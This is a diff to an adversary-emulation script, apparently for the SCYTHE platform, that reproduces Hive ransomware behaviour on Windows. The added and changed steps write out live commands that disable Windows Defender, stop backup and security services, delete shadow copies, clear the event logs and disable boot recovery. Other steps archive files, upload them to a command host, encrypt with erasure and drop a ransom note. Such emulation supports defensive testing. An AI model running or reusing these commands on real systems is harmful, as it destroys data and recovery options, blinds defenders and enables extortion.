@@ -7,14 +7,14 @@
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "conf": "--cp scythe.theshepnet.com:443 --secure true --multipart 10240",
                 "module": "https",
                 "type": "initialization"
             },
             "1": {
-                "name": "THREAT",
+                "name": "IMPACT",
                 "type": "assign",
-                "value": "DESTRUCTIVE"
+                "value": "Caution! If executed in an elevated command prompt, this emulation is risky - It will remove Indicators and Inhibit Recovery in alignment with the threat behavior, however this will not leave the system in an unstable state."
             },
             "2": {
                 "module": "loader",
@@ -35,13 +35,18 @@
             },
             "5": {
                 "function": "ifelse",
-                "next": "24",
+                "next": "28",
                 "step": "4",
                 "type": "decision",
                 "value": "High",
                 "verb": "does not contain"
             },
             "6": {
+                "name": "Impact",
+                "type": "assign",
+                "value": "Disable Windows Defender"
+            },
+            "7": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend",
@@ -50,7 +55,7 @@
                 ],
                 "type": "message"
             },
-            "7": {
+            "8": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop LanmanWorkstation",
@@ -59,7 +64,7 @@
                 ],
                 "type": "message"
             },
-            "8": {
+            "9": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop SamSs",
@@ -68,7 +73,7 @@
                 ],
                 "type": "message"
             },
-            "9": {
+            "10": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop SDRSVC",
@@ -77,7 +82,7 @@
                 ],
                 "type": "message"
             },
-            "10": {
+            "11": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop SstpSVc",
@@ -86,7 +91,7 @@
                 ],
                 "type": "message"
             },
-            "11": {
+            "12": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop UI0Detect",
@@ -95,7 +100,7 @@
                 ],
                 "type": "message"
             },
-            "12": {
+            "13": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop Vmicvss",
@@ -104,7 +109,7 @@
                 ],
                 "type": "message"
             },
-            "13": {
+            "14": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop Vmss",
@@ -113,7 +118,7 @@
                 ],
                 "type": "message"
             },
-            "14": {
+            "15": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop VSS",
@@ -122,7 +127,7 @@
                 ],
                 "type": "message"
             },
-            "15": {
+            "16": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop Wbengine",
@@ -131,7 +136,7 @@
                 ],
                 "type": "message"
             },
-            "16": {
+            "17": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c sc stop Unistoresvc",
@@ -140,7 +145,12 @@
                 ],
                 "type": "message"
             },
-            "17": {
+            "18": {
+                "name": "Impact",
+                "type": "assign",
+                "value": "Delete Shadow Copies"
+            },
+            "19": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wmic.exe SHADOWCOPY /nointeractive",
@@ -149,7 +159,7 @@
                 ],
                 "type": "message"
             },
-            "18": {
+            "20": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wmic.exe shadowcopy delete",
@@ -158,7 +168,12 @@
                 ],
                 "type": "message"
             },
-            "19": {
+            "21": {
+                "name": "Impact",
+                "type": "assign",
+                "value": "Clear Windows Event Logs (System, Security, Application)"
+            },
+            "22": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wevtutil.exe cl system",
@@ -167,7 +182,7 @@
                 ],
                 "type": "message"
             },
-            "20": {
+            "23": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wevtutil.exe cl security",
@@ -176,7 +191,7 @@
                 ],
                 "type": "message"
             },
-            "21": {
+            "24": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wevtutil.exe cl application",
@@ -185,7 +200,12 @@
                 ],
                 "type": "message"
             },
-            "22": {
+            "25": {
+                "name": "Impact",
+                "type": "assign",
+                "value": "Ignore boot failures and disable Windows 10 recovery"
+            },
+            "26": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
@@ -194,7 +214,7 @@
                 ],
                 "type": "message"
             },
-            "23": {
+            "27": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "bcdedit.exe /set {default} recoveryenabled norun",
@@ -203,12 +223,12 @@
                 ],
                 "type": "message"
             },
-            "24": {
+            "28": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "IMPACT"
             },
-            "25": {
+            "29": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell mkdir \"%USERPROFILE%\\Desktop\\Hive\"",
@@ -217,13 +237,13 @@
                 ],
                 "type": "message"
             },
-            "26": {
+            "30": {
                 "module": "loader",
                 "module_to_load": "file",
                 "request": "--load file",
                 "type": "message"
             },
-            "27": {
+            "31": {
                 "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
                 "module": "file",
                 "request": "--create --path \"%USERPROFILE%\\Desktop\\Hive\\target_file.xls\" --size 1MB --count 100 --random",
@@ -232,7 +252,7 @@
                 ],
                 "type": "message"
             },
-            "28": {
+            "32": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell \"Compress-Archive -Path $env:userprofile\\Desktop\\Hive -CompressionLevel Optimal -Destination $env:userprofile\\Desktop\\exfil.zip\"",
@@ -241,13 +261,13 @@
                 ],
                 "type": "message"
             },
-            "29": {
+            "33": {
                 "module": "loader",
                 "module_to_load": "uploader",
                 "request": "--load uploader",
                 "type": "message"
             },
-            "30": {
+            "34": {
                 "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
                 "module": "uploader",
                 "request": "--remotepath \"%USERPROFILE%\\Desktop\\exfil.zip\"",
@@ -256,7 +276,7 @@
                 ],
                 "type": "message"
             },
-            "31": {
+            "35": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "nslookup.exe anonfiles.com",
@@ -265,7 +285,7 @@
                 ],
                 "type": "message"
             },
-            "32": {
+            "36": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "nslookup.exe mega.nz",
@@ -274,7 +294,7 @@
                 ],
                 "type": "message"
             },
-            "33": {
+            "37": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "nslookup.exe send.exploit.in",
@@ -283,7 +303,7 @@
                 ],
                 "type": "message"
             },
-            "34": {
+            "38": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "nslookup.exe ufile.io",
@@ -292,7 +312,7 @@
                 ],
                 "type": "message"
             },
-            "35": {
+            "39": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "nslookup.exe sendspace.com",
@@ -301,13 +321,13 @@
                 ],
                 "type": "message"
             },
-            "36": {
+            "40": {
                 "module": "loader",
                 "module_to_load": "crypt",
                 "request": "--load crypt",
                 "type": "message"
             },
-            "37": {
+            "41": {
                 "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
                 "module": "crypt",
                 "request": "--target \"%USERPROFILE%\\Desktop\\Hive\\\" --encrypt --password \"#RansomwareSucks\" --erase",
@@ -316,7 +336,7 @@
                 ],
                 "type": "message"
             },
-            "38": {
+            "42": {
                 "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
                 "module": "file",
                 "request": "--create --path \"%USERPROFILE%\\Desktop\\Hive\\target_file.key.hive\" --size 1MB --count 1 --random",
@@ -325,13 +345,13 @@
                 ],
                 "type": "message"
             },
-            "39": {
+            "43": {
                 "module": "loader",
                 "module_to_load": "downloader",
                 "request": "--load downloader",
                 "type": "message"
             },
-            "40": {
+            "44": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
                 "request": "--src \"VFS:/shared/threats/Hive/HOW_TO_DECRYPT.txt\" --dest \"%USERPROFILE%\\Desktop\\HOW_TO_DECRYPT.txt\"",
@@ -340,7 +360,7 @@
                 ],
                 "type": "message"
             },
-            "41": {
+            "45": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell notepad \"%USERPROFILE%\\Desktop\\HOW_TO_DECRYPT.txt\"",
@@ -349,12 +369,12 @@
                 ],
                 "type": "message"
             },
-            "42": {
+            "46": {
                 "name": "NOTE",
                 "type": "assign",
                 "value": "NO CLEANUP"
             },
-            "43": {
+            "47": {
                 "module": "controller",
                 "request": "--shutdown",
                 "rtags": [
@@ -364,6 +384,7 @@
                 "type": "message"
             }
         },
-        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
     }
 }
